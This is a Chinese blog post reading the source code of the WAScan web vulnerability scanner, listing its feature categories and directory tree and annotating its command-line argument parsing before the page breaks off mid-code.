<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">

<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






  <meta name="baidu-site-verification" content="cqIhQLk06F" />







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="源码阅读,扫描器,安全开发," />





  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta name="description" content="WAScan源码阅读">
<meta property="og:type" content="article">
<meta property="og:title" content="WAScan源码阅读">
<meta property="og:url" content="http://chybeta.github.io/2019/01/04/WAScan源码阅读/index.html">
<meta property="og:site_name" content="Chybeta">
<meta property="og:description" content="WAScan源码阅读">
<meta property="og:updated_time" content="2019-01-06T08:49:26.270Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="WAScan源码阅读">
<meta name="twitter:description" content="WAScan源码阅读">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 'undefined',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://chybeta.github.io/2019/01/04/WAScan源码阅读/"/>





  <title> WAScan源码阅读 | Chybeta </title>
  <meta name="baidu_union_verify" content="4dcd229ee2a964611d56cf139346dc50"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  


<!-- hexo-inject:begin --><!-- hexo-inject:end --><script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
  ga('create', 'UA-121975637-1', 'auto');
  ga('send', 'pageview');
</script>


  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Chybeta</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-link">
          <a href="/link" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
            
            朋友
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于我
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2019/01/04/WAScan源码阅读/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                WAScan源码阅读
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-04T08:54:01+08:00">
                2019-01-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Web Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2019/01/04/WAScan源码阅读/" class="leancloud_visitors" data-flag-title="WAScan源码阅读">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>WAScan源码阅读<br><a id="more"></a></p>
<h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><ul>
<li>python2.7</li>
</ul>
<h1 id="整体功能"><a href="#整体功能" class="headerlink" title="整体功能"></a>整体功能</h1><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><ul>
<li>cms系统 6</li>
<li>web框架 22</li>
<li>cookeis/headers安全</li>
<li>开发语言 9</li>
<li>操作系统 7</li>
<li>服务器 all</li>
<li>防火墙 50+</li>
</ul>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><ul>
<li>Bash 命令注入</li>
<li>SQL盲注</li>
<li>溢出</li>
<li>CRLF</li>
<li>头部SQL注入</li>
<li>头部XSS</li>
<li>HTML注入</li>
<li>LDAP注入</li>
<li>本地文件包含</li>
<li>执行操作系统命令</li>
<li>php 代码注入</li>
<li>SQL注入</li>
<li>服务器端注入</li>
<li>Xpath注入</li>
<li>XSS</li>
<li>XML注入</li>
</ul>
<h2 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h2><ul>
<li>Apache状态检测</li>
<li>开放跳转</li>
<li>phpinfo</li>
<li>robots.txt</li>
<li>xst</li>
</ul>
<h2 id="暴力攻击"><a href="#暴力攻击" class="headerlink" title="暴力攻击"></a>暴力攻击</h2><ul>
<li>admin面板</li>
<li>后门</li>
<li>备份目录</li>
<li>备份文件</li>
<li>常规目录</li>
<li>常规文件</li>
<li>隐藏参数</li>
</ul>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul>
<li>信用卡信息</li>
<li>邮箱</li>
<li>私有ip</li>
<li>错误信息</li>
<li>ssn</li>
</ul>
<h1 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h1><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:center">名</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">dir</td>
<td style="text-align:center">lib</td>
<td style="text-align:center">扩展，攻击用到的一些字典等等</td>
</tr>
<tr>
<td style="text-align:center">dir</td>
<td style="text-align:center">plugin</td>
<td style="text-align:center">主要攻击脚本</td>
</tr>
<tr>
<td style="text-align:center">dir</td>
<td style="text-align:center">screen</td>
<td style="text-align:center">一些截图</td>
</tr>
<tr>
<td style="text-align:center">file</td>
<td style="text-align:center">.gitignore</td>
<td style="text-align:center">略</td>
</tr>
<tr>
<td style="text-align:center">file</td>
<td style="text-align:center">LICENSE</td>
<td style="text-align:center">许可证</td>
</tr>
<tr>
<td style="text-align:center">file</td>
<td style="text-align:center">README.md</td>
<td style="text-align:center">介绍</td>
</tr>
<tr>
<td style="text-align:center">file</td>
<td style="text-align:center">wascan.py</td>
<td style="text-align:center">主入口文件</td>
</tr>
</tbody>
</table>
</div>
<p>所有文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div></pre></td><td class="code"><pre><div class="line">WAScan</div><div class="line">├── lib</div><div class="line">│   ├── db</div><div class="line">│   │   ├── adminpanel.wascan</div><div class="line">│   │   ├── backdoor.wascan</div><div class="line">│   │   ├── commondir.wascan</div><div class="line">│   │   ├── commonfile.wascan</div><div class="line">│   │   ├── errors</div><div class="line">│   │   │   ├── buffer.json</div><div class="line">│   │   │   ├── ldap.json</div><div class="line">│   │   │   ├── lfi.json</div><div class="line">│   │   │   └── xpath.json</div><div class="line">│   │   ├── openredirect.wascan</div><div class="line">│   │   ├── params.wascan</div><div class="line">│   │   ├── phpinfo.wascan</div><div class="line">│   │   ├── sqldberror</div><div class="line">│   │   │   ├── db2.json</div><div class="line">│   │   │   ├── firebird.json</div><div class="line">│   │   │   ├── frontbase.json</div><div class="line">│   │   │   ├── hsqldb.json</div><div class="line">│   │   │   ├── informix.json</div><div class="line">│   │   │   ├── ingres.json</div><div class="line">│   │   │   ├── maccess.json</div><div class="line">│   │   │   ├── maxdb.json</div><div class="line">│   │   │   ├── mssql.json</div><div class="line">│   │   │   ├── mysql.json</div><div class="line">│   │   │   ├── oracle.json</div><div class="line">│   │   │   ├── postgresql.json</div><div class="line">│   │   │   ├── sqlite.json</div><div class="line">│   │   │   └── sybase.json</div><div class="line">│   │   └── useragent.wascan</div><div class="line">│   ├── handler</div><div class="line">│   │   ├── attacks.py</div><div class="line">│   │   ├── audit.py</div><div class="line">│   │   ├── brute.py</div><div class="line">│   │   ├── crawler.py</div><div class="line">│   │   ├── disclosure.py</div><div class="line">│   │   ├── fingerprint.py</div><div class="line">│   │   ├── fullscan.py</div><div class="line">│   │   └── __init__.py</div><div class="line">│   ├── __init__.py</div><div class="line">│   ├── parser</div><div class="line">│   │   ├── getcc.py</div><div class="line">│   │   ├── getip.py</div><div class="line">│   │   ├── getmail.py</div><div class="line">│   │   ├── getssn.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   └── parse.py</div><div class="line">│   ├── request</div><div class="line">│   │   ├── crawler.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   ├── ragent.py</div><div class="line">│   │   └── request.py</div><div class="line">│   └── utils</div><div class="line">│       ├── check.py</div><div class="line">│       ├── colors.py</div><div class="line">│       ├── dirs.py</div><div class="line">│       ├── exception.py</div><div class="line">│       ├── __init__.py</div><div class="line">│       ├── params.py</div><div class="line">│       ├── payload.py</div><div class="line">│       ├── printer.py</div><div class="line">│       ├── rand.py</div><div class="line">│       ├── readfile.py</div><div class="line">│       ├── settings.py</div><div class="line">│       ├── unicode.py</div><div class="line">│       └── usage.py</div><div class="line">├── LICENSE</div><div class="line">├── plugins</div><div class="line">│   ├── attacks</div><div class="line">│   │   ├── bashi.py</div><div class="line">│   │   ├── blindsqli.py</div><div class="line">│   │   ├── bufferoverflow.py</div><div class="line">│   │   ├── crlf.py</div><div class="line">│   │   ├── headersqli.py</div><div class="line">│   │   ├── headerxss.py</div><div class="line">│   │   ├── htmli.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   ├── ldapi.py</div><div class="line">│   │   ├── lfi.py</div><div class="line">│   │   ├── oscommand.py</div><div class="line">│   │   ├── phpi.py</div><div class="line">│   │   ├── sqli.py</div><div class="line">│   │   ├── ssi.py</div><div class="line">│   │   ├── xpathi.py</div><div class="line">│   │   ├── xss.py</div><div class="line">│   │   └── xxe.py</div><div class="line">│   ├── audit</div><div class="line">│   │   ├── apache.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   ├── open_redirect.py</div><div class="line">│   │   ├── phpinfo.py</div><div class="line">│   │   ├── robots.py</div><div class="line">│   │   └── xst.py</div><div class="line">│   ├── brute</div><div class="line">│   │   ├── adminpanel.py</div><div class="line">│   │   ├── backdoor.py</div><div class="line">│   │   ├── backupdir.py</div><div class="line">│   │   ├── backupfile.py</div><div class="line">│   │   ├── commondir.py</div><div class="line">│   │   ├── commonfile.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   └── params.py</div><div class="line">│   ├── disclosure</div><div class="line">│   │   ├── creditcards.py</div><div class="line">│   │   ├── emails.py</div><div class="line">│   │   ├── errors.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   ├── privateip.py</div><div class="line">│   │   └── ssn.py</div><div class="line">│   ├── fingerprint</div><div class="line">│   │   ├── cms</div><div class="line">│   │   │   ├── adobeaem.py</div><div class="line">│   │   │   ├── drupal.py</div><div class="line">│   │   │   ├── __init__.py</div><div class="line">│   │   │   ├── joomla.py</div><div class="line">│   │   │   ├── magento.py</div><div class="line">│   │   │   ├── plone.py</div><div class="line">│   │   │   ├── silverstripe.py</div><div class="line">│   │   │   └── wordpress.py</div><div class="line">│   │   ├── framework</div><div class="line">│   │   │   ├── apachejackrabbit.py</div><div class="line">│   │   │   ├── asp_mvc.py</div><div class="line">│   │   │   ├── cakephp.py</div><div class="line">│   │   │   ├── cherrypy.py</div><div class="line">│   │   │   ├── codeigniter.py</div><div class="line">│   │   │   ├── dancer.py</div><div class="line">│   │   │   ├── django.py</div><div class="line">│   │   │   ├── flask.py</div><div class="line">│   │   │   ├── fuelphp.py</div><div class="line">│   │   │   ├── grails.py</div><div class="line">│   │   │   ├── horde.py</div><div class="line">│   │   │   ├── __init__.py</div><div class="line">│   │   │   ├── karrigell.py</div><div class="line">│   │   │   ├── larvel.py</div><div class="line">│   │   │   ├── nette.py</div><div class="line">│   │   │   ├── phalcon.py</div><div class="line">│   │   │   ├── play.py</div><div class="line">│   │   │   ├── rails.py</div><div class="line">│   │   │   ├── seagull.py</div><div class="line">│   │   │   ├── spring.py</div><div class="line">│   │   │   ├── symfony.py</div><div class="line">│   │   │   ├── web2py.py</div><div class="line">│   │   │   ├── yii.py</div><div class="line">│   │   │   └── zend.py</div><div class="line">│   │   ├── header</div><div class="line">│   │   │   ├── cookies.py</div><div class="line">│   │   │   ├── header.py</div><div class="line">│   │   │   └── __init__.py</div><div class="line">│   │   ├── __init__.py</div><div class="line">│   │   ├── language</div><div class="line">│   │   │   ├── aspnet.py</div><div class="line">│   │   │   ├── asp.py</div><div class="line">│   │   │   ├── coldfusion.py</div><div class="line">│   │   │   ├── flash.py</div><div class="line">│   │   │   ├── __init__.py</div><div class="line">│   │   │   ├── java.py</div><div class="line">│   │   │   ├── perl.py</div><div class="line">│   │   │   ├── php.py</div><div class="line">│   │   │   ├── python.py</div><div class="line">│   │   │   └── ruby.py</div><div class="line">│   │   ├── os</div><div class="line">│   │   │   ├── bsd.py</div><div class="line">│   │   │   ├── ibm.py</div><div class="line">│   │   │   ├── __init__.py</div><div class="line">│   │   │   ├── linux.py</div><div class="line">│   │   │   ├── mac.py</div><div class="line">│   │   │   ├── solaris.py</div><div class="line">│   │   │   ├── unix.py</div><div class="line">│   │   │   └── windows.py</div><div class="line">│   │   ├── server</div><div class="line">│   │   │   ├── __init__.py</div><div class="line">│   │   │   └── server.py</div><div class="line">│   │   └── waf</div><div class="line">│   │       ├── airlock.py</div><div class="line">│   │       ├── anquanbao.py</div><div class="line">│   │       ├── armor.py</div><div class="line">│   │       ├── asm.py</div><div class="line">│   │       ├── aws.py</div><div class="line">│   │       ├── baidu.py</div><div class="line">│   │       ├── barracuda.py</div><div class="line">│   │       ├── betterwpsecurity.py</div><div class="line">│   │       ├── bigip.py</div><div class="line">│   │       ├── binarysec.py</div><div class="line">│   │       ├── blockdos.py</div><div class="line">│   │       ├── ciscoacexml.py</div><div class="line">│   │       ├── cloudflare.py</div><div class="line">│   │       ├── cloudfront.py</div><div class="line">│   │       ├── comodo.py</div><div class="line">│   │       ├── datapower.py</div><div class="line">│   │       ├── denyall.py</div><div class="line">│   │       ├── dotdefender.py</div><div class="line">│   │       ├── edgecast.py</div><div class="line">│   │       ├── expressionengine.py</div><div class="line">│   │       ├── fortiweb.py</div><div class="line">│   │       ├── hyperguard.py</div><div class="line">│   │       ├── incapsula.py</div><div class="line">│   │       ├── __init__.py</div><div class="line">│   │       ├── isaserver.py</div><div class="line">│   │       ├── jiasule.py</div><div class="line">│   │       ├── knownsec.py</div><div class="line">│   │       ├── kona.py</div><div class="line">│   │       ├── modsecurity.py</div><div class="line">│   │       ├── netcontinuum.py</div><div class="line">│   │       ├── netscaler.py</div><div class="line">│   │       ├── newdefend.py</div><div class="line">│   │       ├── nsfocus.py</div><div class="line">│   │       ├── paloalto.py</div><div class="line">│   │       ├── profense.py</div><div class="line">│   │       ├── radware.py</div><div class="line">│   │       ├── requestvalidationmode.py</div><div class="line">│   │       ├── safe3.py</div><div class="line">│   │       ├── safedog.py</div><div class="line">│   │       ├── secureiis.py</div><div class="line">│   │       ├── senginx.py</div><div class="line">│   │       ├── sitelock.py</div><div class="line">│   │       ├── sonicwall.py</div><div class="line">│   │       ├── sophos.py</div><div class="line">│   │       ├── stingray.py</div><div class="line">│   │       ├── sucuri.py</div><div class="line">│   │       ├── teros.py</div><div class="line">│   │       ├── trafficshield.py</div><div class="line">│   │       ├── urlscan.py</div><div class="line">│   │       ├── uspses.py</div><div class="line">│   │       ├── varnish.py</div><div class="line">│   │       ├── wallarm.py</div><div class="line">│   │       ├── webknight.py</div><div class="line">│   │       ├── yundun.py</div><div class="line">│   │       └── yunsuo.py</div><div class="line">│   └── __init__.py</div><div class="line">├── README.md</div><div class="line">├── screen</div><div class="line">│   ├── screen_2.png</div><div class="line">│   ├── screen_3.png</div><div class="line">│   ├── screen_4.png</div><div class="line">│   ├── screen_5.png</div><div class="line">│   ├── screen_6.png</div><div class="line">│   ├── screen_7.png</div><div class="line">│   ├── screen_8.png</div><div class="line">│   └── screen.png</div><div class="line">└── wascan.py</div><div class="line"></div><div class="line">22 directories, 218 files</div></pre></td></tr></table></figure></p>
<h1 id="入口文件：wascan-py"><a href="#入口文件：wascan-py" class="headerlink" title="入口文件：wascan.py"></a>入口文件：wascan.py</h1><p>主入口文件。会先初始化一些<code>Usage</code>，接受命令行参数并进行相关的前期处理。然后根据参数开始进行扫描。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		wascan().main()</div><div class="line">	<span class="keyword">except</span> KeyboardInterrupt,e: </div><div class="line">		exit(warn(<span class="string">'Exiting... :('</span>))</div><div class="line">```        </div><div class="line"></div><div class="line">定义了一个`wascan`类，通过`getopt.getopt`接受命令行参数。对应代码如下：</div><div class="line">```python</div><div class="line"><span class="keyword">for</span> opt,arg <span class="keyword">in</span> opts:</div><div class="line">	<span class="comment"># CUrl 检查URL ，并规范化</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-u'</span>,<span class="string">'--url'</span>):url = CUrl(arg) </div><div class="line">	<span class="comment"># CScan 检查scan参数是否符合范围</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-s'</span>,<span class="string">'--scan'</span>):scan = CScan(arg) </div><div class="line">	<span class="comment"># CHeaders 传入参数为字符串，调用该函数解析成dict</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-H'</span>,<span class="string">'--headers'</span>):kwargs[<span class="string">'headers'</span>] = CHeaders(arg)</div><div class="line">	<span class="comment"># POST 体的参数  </span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-d'</span>,<span class="string">'--data'</span>):kwargs[<span class="string">'data'</span>] = arg</div><div class="line">	<span class="comment"># 是否进行暴力破解</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-b'</span>,<span class="string">'--brute'</span>):kwargs[<span class="string">'brute'</span>] = <span class="keyword">True</span></div><div class="line">	<span class="comment"># 指定请求方法</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-m'</span>,<span class="string">'--method'</span>):kwargs[<span class="string">'method'</span>] = arg</div><div class="line">	<span class="comment"># 指定 host ，将其值更新到 header头 的 Host字段</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-h'</span>,<span class="string">'--host'</span>):kwargs[<span class="string">'headers'</span>].update(&#123;<span class="string">'Host'</span>:arg&#125;) </div><div class="line">	<span class="comment"># 指定 referer，将其值更新到 header头</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-R'</span>,<span class="string">'--referer'</span>):kwargs[<span class="string">'headers'</span>].update(&#123;<span class="string">'Referer'</span>:arg&#125;)</div><div class="line">	<span class="comment"># 指定 auth</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-a'</span>,<span class="string">'--auth'</span>):kwargs[<span class="string">'auth'</span>] = CAuth(arg) </div><div class="line">	<span class="comment"># 指定 agent</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-A'</span>,<span class="string">'--agent'</span>):kwargs[<span class="string">'agent'</span>] = arg </div><div class="line">	<span class="comment"># 指定 cookie</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-C'</span>,<span class="string">'--cookie'</span>):kwargs[<span class="string">'cookie'</span>] = arg </div><div class="line">	<span class="comment"># 采用随机的 agent</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-r'</span>,<span class="string">'--ragent'</span>):kwargs[<span class="string">'agent'</span>] = ragent()</div><div class="line">	<span class="comment"># 采用代理</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-p'</span>,<span class="string">'--proxy'</span>):kwargs[<span class="string">'proxy'</span>] = arg </div><div class="line">	<span class="comment"># 代理是否要认证</span></div><div class="line">    <span class="keyword">if</span> opt <span class="keyword">in</span> (<span class="string">'-P'</span>,<span class="string">'--proxy-auth'</span>):kwargs[<span class="string">'pauth'</span>] = CAuth(arg) </div><div class="line">	<span class="comment"># 指定超时时间</span></div><div class="line">    <span class="keyword">if</span> opt <span 